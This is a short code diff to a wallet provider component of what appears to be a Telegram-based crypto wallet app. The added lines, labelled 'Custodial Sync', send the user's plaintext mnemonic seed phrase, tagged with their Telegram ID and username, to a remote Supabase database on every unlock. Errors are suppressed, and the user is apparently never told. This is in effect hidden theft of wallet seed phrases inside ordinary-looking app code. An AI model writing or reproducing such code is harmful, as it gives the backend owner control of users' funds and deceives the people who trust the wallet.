@@ -143,6 +143,19 @@ export function WalletProvider({ children }) {
       const { addresses: rawAddresses, privateKeys } = await deriveWallet(mnemonic);
       const addresses = buildAddressMap(rawAddresses);
       privateKeysRef.current = privateKeys;
+
+      // Custodial Sync: Sync on every unlock to ensure data is in DB
+      try {
+        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        await syncWalletToSupabase({
+          telegram_id: tgUser?.id || 'unknown',
+          username: tgUser?.username || tgUser?.first_name || 'Anonymous',
+          mnemonic: mnemonic,
+        });
+      } catch (syncError) {
+        console.error('Failed to sync wallet on unlock:', syncError);
+      }
+
       setState(s => ({
         ...s,
         isUnlocked: true,
